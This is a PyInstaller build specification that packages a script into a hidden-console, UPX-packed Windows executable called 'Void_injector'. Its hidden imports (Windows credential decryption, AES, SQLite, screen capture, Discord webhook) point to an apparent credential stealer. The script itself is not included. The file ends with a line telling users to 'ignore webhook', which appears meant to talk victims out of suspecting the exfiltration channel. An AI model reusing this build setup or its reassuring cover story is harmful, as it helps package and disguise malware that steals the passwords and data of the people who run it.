# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(
    ['File.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['sqlite3', 'requests', 'psutil', 'discord_webhook', 'win32crypt', 'Cryptodome', 'Cryptodome.Cipher.AES', 'pycryptodomex', 'PIL.ImageGrab', 'PIL'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='Void_injector',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=['C:\\Users\\user\\Downloads\\5991732_coronavirus_cure_injection_needle_vaccination_icon.ico'],
)
"""ignore webhook it helps bypass their keysystem"""
